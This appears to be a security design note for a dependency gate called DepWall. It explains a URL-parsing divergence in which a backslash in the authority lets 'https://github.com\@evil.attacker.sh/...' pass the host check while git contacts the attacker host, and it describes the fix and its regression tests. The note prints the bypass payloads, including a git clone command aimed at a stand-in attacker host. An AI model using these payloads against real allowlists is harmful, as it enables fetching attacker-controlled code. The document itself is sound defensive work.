# Attack class: URL parser divergence (backslash in the authority)

DepWall resolves a spec's host with `new URL()` (Node/WHATWG), which folds a
literal `\` into `/` for special schemes. git and curl follow RFC 3986 and read
the segment before the backslash as *userinfo*, contacting whatever host
follows the `@`. An attacker prefixes a trusted forge name to walk through the
host gate:

    git clone "https://github.com\@evil.attacker.sh/o/r"
    # DepWall saw github.com (ALLOW); git cloned from evil.attacker.sh

Verified against real git using an `.invalid` probe host, so nothing was ever
contacted. Same vulnerability class as fast-uri GHSA-v2hh-gcrm-f6hx ("reject
literal backslash in URI authority"), which surfaced it.

The slash-run after `scheme:` is not always `//` — WHATWG's special-authority-
slashes state skips an *arbitrary run* of `/` and `\` before the authority
begins, so `https:///github.com\@evil`, `https:\\github.com\@evil` and
`https:/\github.com\@evil` all reach the same divergence with zero, one, or a
mixed run of slashes/backslashes in place of `//`.

`classifyDirectSource` now refuses to classify any `scheme:` spec whose
slash-run **or** authority contains a literal backslash → `unparseable` →
**ASK** in every consumer (clone gate, pipe-to-shell, direct-source
provenance). `file:` is handled by a stricter `://`-authority-only rule, so
`file:///C:\path` (a Windows drive path — the user's own disk) still resolves
local, while `file://\\server\share` (a remote SMB fetch) is refused.

Sibling shapes (`%5C`, tab, newline, CR, double-`@`, plain userinfo) were
measured: `new URL()` already resolves the attacker host for all of them, so
they were never bypasses and already ASK. They are kept here as controls so a
future change cannot silently relax them.

Regression tests: tests/hook/url-confusion.test.ts,
tests/hook/url-confusion-corpus.test.ts
